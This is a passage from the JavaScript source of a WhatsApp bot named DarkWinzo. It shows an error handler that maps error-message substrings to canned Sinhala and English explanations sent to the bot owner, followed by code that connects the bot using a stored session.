                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Ookla Server Connection_' +
                                        '\n*හේතුව:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*විසදුම:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Requested Audio Params_' +
                                        '\n*හේතුව:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*විසදුම:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _එවැනි ගොනුවක් හෝ ඩිරෙක්ටරියක් නැත_' +
                                        '\n*හේතුව:* _ප්ලගිනයේ වැරදි කේතනීකරණය._' +
                                        '\n*විසදුම:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _ 404 HTTPS දෝශය_' +
                                        '\n*හේතුව:* _හෙරෝකු ප්ලගිනය යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
                                        '\n*විසදුම:* _ටික වේලාවක් බලා නැවත උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, වෙබ් අඩවියේ ගනුදෙනුව සිදු කරන්න.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Reply Delete කාර්යය_' +
                                        '\n*හේතුව:* _IMG හෝ WIKI විධානයන් භාවිතා කිරීම.._' +
                                        '\n*විසදුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය මාරාන්තික දෝශයක් නොවේ_'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Reply Delete කාර්යය_' +
                                        '\n*හේතුව:* _IMG හෝ WIKI විධානයන් භාවිතා කිරීම.._' +
                                        '\n*විසදුම:* _මෙම දෝෂය සඳහා විසඳුමක් නොමැත. එය මාරාන්තික දෝශයක් නොවේ_'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Bailyes ක්‍රියාකිරීමේ දෝශය_ ' +
                                        '\n*හේතුව:* _නිශ්චිත හේතුව නොදනී. විකල්ප කිහිපයක් මෙම දෝෂය ඇති වීමට හේතු විය හැක.._' +
                                        '\n*විසදුම:* _ඔබ එය නැවත භාවිතා කළහොත් එය වැඩිදියුණු විය හැකිය. දෝෂය දිගටම පැවතුනහොත්, ඔබට restart කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _පෙළ හෝ මාධ්‍ය විකේතනය කළ නොහැක_' +
                                        '\n*හේතුව:* _කමාන්ඩ් එක වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*විසදුම:* _කමාන්ඩ් විස්තරයේ ලියා ඇති පරිදි කරුණාකර විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _අකුරු චරිත භාවිතය_' +
                                        '\n*හේතුව:* _ලතින් හෝඩියේ පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසදුම:* _ඔබ ලතින් හෝඩියේ විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත ...._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                               
                                if (error.message.includes('URL')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ ERROR ANALYSIS [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await CdDark.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            CdDark.loadAuthInfo(Session.deCrypt(Isuru.SESSION)); 
            try {
                await CdDark.connect();
            } catch {
                return;
            }
        }
    }
}

DarkWinzo();

